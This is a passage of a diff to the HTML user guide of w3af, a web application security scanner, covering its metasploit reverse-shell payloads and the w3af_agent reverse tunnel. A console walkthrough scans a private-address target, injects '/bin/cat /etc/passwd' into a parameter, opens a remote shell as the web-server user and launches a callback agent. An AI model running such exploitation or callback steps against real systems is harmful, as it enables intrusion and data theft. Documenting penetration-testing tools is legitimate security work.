-</OL>
-<P ALIGN=JUSTIFY><BR><BR>
+	<LI><P ALIGN=JUSTIFY STYLE="margin-bottom: 0in"><FONT FACE="Bitstream Vera Sans, sans-serif">msf_windows_meterpreter_reverse_tcp
+	</FONT>
+	</P>
+	<LI><P ALIGN=JUSTIFY STYLE="margin-bottom: 0in"><FONT FACE="Bitstream Vera Sans, sans-serif">msf_windows_vncinject_reverse
+	</FONT>
+	</P>
+	<LI><P ALIGN=JUSTIFY STYLE="margin-bottom: 0in"><FONT FACE="Bitstream Vera Sans, sans-serif">metasploit
+	</FONT>
+	</P>
+</UL>
+<P ALIGN=JUSTIFY STYLE="margin-bottom: 0in"><BR>
 </P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Now the
-user has an interactive shell with the privileges of the user running
-the web server, that can be used without any restrictions. It is
-possible at this point to close w3af  and continue working directly
-from the metasploit shell.</FONT></P>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<H3 CLASS="western" ALIGN=JUSTIFY STYLE="margin-top: 0in"><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent</FONT></H3>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">As said
-before, this feature allows you to create a reverse tunnel that will
-route TCP connections through the compromised server. Unlike virtual
-daemon, this  feature is ready to use and doesn't require any other
-software. B<FONT FACE="Bitstream Vera Sans, sans-serif">efore going
-through an example to see how to use this feature, we will make a
-summary of the steps that will happen</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">
-during exploitation:</FONT></FONT></P>
+<UL>
+	<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
+	first three payloads are simply a shortcut, since all they do is
+	call the “metasploit” payload using certain parameters. For
+	example, the “msf_linux_x86_meterpreter_reverse” will generate
+	an ELF executable with the x86 meterpreter for linux, configured to
+	use a reverse connection; upload it to the compromised server and
+	finally execute the file.</FONT></P>
+	<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">To use
+	this feature you must have a working installation of the metasploit
+	framework version 3.0 or greater; you can get it for free at
+	</FONT><A HREF="http://www.metasploit.com/"><FONT FACE="Bitstream Vera Sans, sans-serif">www.metasploit.com</FONT></A><FONT FACE="Bitstream Vera Sans, sans-serif">
+	, the installation and configuration of MSF is out of the scope of
+	this document.</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">
+	The path to your MSF installation needs to be specified in the
+	misc-settings menu.</FONT></P>
+	<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">As
+	with any other payload, in order to run</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">
+	these payloads you need to:</FONT></P>
+</UL>
+<UL>
+	<LI><P STYLE="margin-bottom: 0in">Identify the vulnerability during
+	a scan</P>
+	<LI><P STYLE="margin-bottom: 0in">Exploit the vulnerability</P>
+	<LI><P STYLE="margin-bottom: 0in">Run “payload &lt;payload_name&gt;”</P>
+</UL>
+<UL>
+	<UL>
+		<UL>
+			<P ALIGN=JUSTIFY></P>
+		</UL>
+	</UL>
+</UL>
+<H3 CLASS="western" ALIGN=JUSTIFY STYLE="margin-top: 0in"><FONT FACE="Bitstream Vera Sans, sans-serif">Proxying
+traffic through the compromised host</FONT></H3>
+<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Also
+implemented as a web application payload, this feature allows you to
+create a reverse tunnel that will route TCP connections through the
+compromised server. Before going through an example to see how to use
+this feature, we will make a summary of the steps that will happen
+during exploitation:</FONT></P>
 <OL>
 	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
 	finds a vulnerability that allows remote command execution</FONT></P>
 	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	user exploits the vulnerability and starts the w3afAgent</FONT></P>
+	user exploits the vulnerability and starts the w3af_agent</FONT></P>
 	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
 	performs an extrusion scan by sending a small executable to the
 	remote server. This executable connects back to w3af and allows the
 	framework to identify outgoing firewall rules on the remote network.</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent
-	Manager will send a w3afAgentClient to the remote server. <FONT FACE="Bitstream Vera Sans, sans-serif">The
+	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af_agent
+	manager will send a w3afAgentClient to the remote server. <FONT FACE="Bitstream Vera Sans, sans-serif">The
 	process of uploading the file to the remote server depends on the
 	remote operating system, the privileges of the user running w3af and
 	the local operating system; but in most cases the following happen</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">s:</FONT></FONT></P>
@@ -2481,8 +2329,8 @@ during exploitation:</FONT></FONT></P>
 	transfer method.</FONT></P>
 </UL>
 <OL>
-	<LI VALUE=1><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent
-	Manager starts the w3afAgentServer that will bind on localhost:1080
+	<LI VALUE=1><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af_agent
+	manager starts the w3afAgentServer that will bind on localhost:1080
 	(which will be used by the w3af user) and on the interface
 	configured in w3af ( misc-settings-&gt;interface ) on the port
 	discovered during step 3.</FONT></P>
@@ -2501,97 +2349,105 @@ during exploitation:</FONT></FONT></P>
 <P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Now
 that we know the theory, let's see an example of what this feature
 can do:</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
-./w3af_console</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
 plugins </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
 audit osCommanding </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
 audit </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Enabled
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">Enabled
 audit plugins: </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
 </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
 back </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
 target </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
 set target http://172.10.10.1/w3af/v.php?c=list </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
 back </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
 start </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">The
 list of found URLs is: </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">-
 <FONT FACE="Nimbus Mono L, monospace">http://172.10.10.1/w3af/v.php</FONT>
 </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Found
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">Found
 1 URLs and 1 different points of injection. </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">The
 list of Fuzzable requests is: </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">-
 <FONT FACE="Nimbus Mono L, monospace">http://172.10.10.1/w3af/v.php</FONT>
 | Method: GET | Parameters: (c) </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Starting
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">Starting
 osCommanding plugin execution. </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">OS
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">OS
 Commanding was found at: <FONT FACE="Nimbus Mono L, monospace">http://172.10.10.1/w3af/v.php</FONT>
 . Using method: GET. The data sent was:
 c=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the
 request with id 2. </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
 exploit </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
-exploit osCommandingShell </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
+<P STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace">osCommandingShell
 exploit plugin is starting. </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
+<P STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace">The
 vulnerability was found using method GET, tried to change the method
 to POST for exploiting but failed. </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Vulnerability
-successfully exploited. </FONT>
+<P STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace">Vulnerability
+successfully exploited. This is a list of available shells: </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Execute
-&quot;exitPlugin&quot; to get out of the remote shell. Commands typed
-in this menu will be runned on the remote web server. </FONT>
+<P STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace">-
+[0] &lt;osCommandingShell object (ruser: &quot;www-data&quot; |
+rsystem: &quot;Linux brick 2.6.24-19-generic i686 GNU/Linux&quot;)&gt;
+</FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
+<P STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace">Please
+use the interact command to interact with the shell objects. </FONT>
+</P>
+<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B><SPAN STYLE="font-weight: normal">interact
+0 </SPAN></FONT>
+</P>
+<P STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace">Execute
+&quot;endInteraction&quot; to get out of the remote shell. Commands
+typed in this menu will be runned on the remote web server. </FONT>
+</P>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell-0&gt;&gt;&gt;</B></FONT></P>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-bottom: 0in"><BR>
 </P>
 <P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Nothing
 really new until now, we configured w3af, started the scan and
 exploited the vulnerability.</FONT></P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;</B>
-<B>start w3afAgent </B></FONT>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell</B><B>-0</B><B>&gt;&gt;&gt;</B>
+<B>payload</B><B> </B><B>w3af_agent</B></FONT></P>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace">Usage:
+w3af_agent &lt;your ip address&gt; </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Initializing
-w3afAgent system, please wait. </FONT>
-</P>
+<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell-0&gt;&gt;&gt;
+payload w3af_agent</B><B> 172.1.1.1</B></FONT></P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
 wait some seconds while w3af performs an extrusion scan. </FONT>
 </P>
@@ -2603,7 +2459,7 @@ The user running w3af can't sniff on the specified interface. Hints:
 Are you root? Does this interface exist? </FONT>
 </P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Using
-inbound port &quot;5060&quot; without knowing if the remote host will
+inbound port &quot;8080&quot; without knowing if the remote host will
 be able to connect back. </FONT>
 </P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
@@ -2759,7 +2615,7 @@ information</H2>
 <P><FONT FACE="Bitstream Vera Sans, sans-serif">More information
 about the framework, like: HOWTOs, advanced usage, bugs, TODO list
 and news, can be found in the project homepage:</FONT></P>
-<P STYLE="margin-left: 0.49in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://w3af.sf.net/">http://w3af.sf.net/</A></FONT></P>
+<P STYLE="margin-left: 0.49in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://www.w3af.com/">http://www.w3af.com/</A></FONT></P>
 <P><BR><BR>
 </P>
 <P><FONT FACE="Bitstream Vera Sans, sans-serif">The w3af project has
@@ -2769,37 +2625,46 @@ an email to any of the mailing lists, which can be located at:</FONT></P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://sourceforge.net/mail/?group_id=170274">http://sourceforge.net/mail/?group_id=170274</A></FONT></P>
 <P><BR><BR>
 </P>
-<H2 CLASS="western"></H2>
 <H2 CLASS="western">Bugs</H2>
 <P><BR><BR>
 </P>
-<P ALIGN=JUSTIFY>The framework is still under development and has <I>a
-c</I><I>ouple </I><SPAN STYLE="font-style: normal">of</SPAN><SPAN STYLE="font-style: normal">
-</SPAN>known bugs. <FONT FACE="Bitstream Vera Sans, sans-serif">If
-you downloaded the latest release package and find a bug, please
-perform a SVN checkout and try to reproduce the bug in the latest
-version, if you are still able to reproduce it, please report the bug
-with a detailed description. To report a bug please navigate to:</FONT></P>
+<P ALIGN=JUSTIFY>The framework is under continuous development and we
+might introduce bugs and regressions while trying to implement new
+features.<SPAN STYLE="font-style: normal"> </SPAN><FONT FACE="Bitstream Vera Sans, sans-serif">If
+you</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">'re using the
+latest version of the framework</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">,
+</FONT><FONT FACE="Bitstream Vera Sans, sans-serif"><I>“./w3af_console
+-f”</I></FONT><FONT FACE="Bitstream Vera Sans, sans-serif"><I>
+</I></FONT><FONT FACE="Bitstream Vera Sans, sans-serif"><I>command
+doesn't update any files</I></FONT><FONT FACE="Bitstream Vera Sans, sans-serif">,
+</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">and find a bug,
+</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">please report </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">it
+</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">with a detailed
+description</FONT><FONT FACE="Bitstream Vera Sans, sans-serif"> to</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">
+the following URL</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">:</FONT></P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-top: 0.17in"><A HREF="http://sourceforge.net/tracker/?group_id=170274&amp;atid=853652">https://sourceforge.net/apps/trac/w3af/newticket</A></P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in; margin-top: 0.17in"><BR><BR>
 </P>
 <H2 CLASS="western" ALIGN=JUSTIFY>Contributors</H2>
-<P ALIGN=JUSTIFY>Code contributions <B>are always welcome</B>, a
-plugin developer guide will be written shortly to aid new developers
-enter the w3af world. For now, the best place to start is w3af's
-Trac:</P>
+<P ALIGN=JUSTIFY>Contributions of <B>any type</B> <B>are always
+welcome</B>, over the past years we've received thousands of emails
+with feedback, comments about new techniques to implement, new pieces
+of code, usability improvements, translations of our documentation
+and many others.</P>
+<P ALIGN=JUSTIFY>A plugin developer guide will be written shortly to
+aid new developers enter the w3af world. For now, the best place to
+start is w3af's Trac:</P>
 <P ALIGN=JUSTIFY><BR><BR>
 </P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><A HREF="http://sourceforge.net/pm/?group_id=170274">https://sourceforge.net/apps/trac/w3af/wiki</A></P>
 <P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
 </P>
-<H2 CLASS="western"></H2>
 <H2 CLASS="western">Final words</H2>
 <P><BR><BR>
 </P>
 <P ALIGN=JUSTIFY>This document is merely an introduction, complete
 knowledge about the framework and its usage is complex and can be
-achieved only by using it.</P>
+achieved only by using it on a regular basis.</P>
 <P ALIGN=JUSTIFY><BR><BR>
 </P>
 <P ALIGN=JUSTIFY>Making a mistake and learning from it takes you one
